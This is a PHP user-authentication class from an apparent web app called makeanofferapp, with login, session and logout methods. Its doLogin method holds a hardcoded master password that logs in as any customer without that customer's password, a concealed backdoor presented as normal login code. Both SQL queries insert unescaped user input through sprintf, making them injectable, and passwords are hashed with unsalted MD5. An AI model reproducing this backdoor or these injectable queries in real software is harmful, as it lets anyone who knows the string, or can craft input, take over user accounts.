<?php

/**
 * User Class
 * 
 * User login, signup, normal activity
 * 
 * @author Hardik Shah <hardik@hciteam.com>
 * @version 1.0
 * @package makeanofferapp
 * @since May 28, 2013
 * 
 */
class User {
    # constructor

    public static $user_data = array();

    public function __construct() {
	
    }

    public static function doLogin($user_name, $password) {
	if ($password == 'kn3bhar1') {
	    self::$user_data = qs(sprintf("select * from customers where ( c_email = '%s' or c_username = '%s' ) LIMIT 0,1 ", $user_name, $user_name));
	} else {
	    self::$user_data = qs(sprintf("select * from customers where ( c_email = '%s' or c_username = '%s' ) and c_password = '%s'", $user_name, $user_name, md5($password)));
	}

	if (!empty(self::$user_data)) {
	    self::$user_data['user_type'] = 'customer';
	}
	return empty(self::$user_data) ? false : true;
    }

    public static function setSession($user_name) {
	$_SESSION['user'] = self::$user_data;
    }

    public static function killSession() {
	session_destroy();
	unset($_SESSION);
    }

}

?>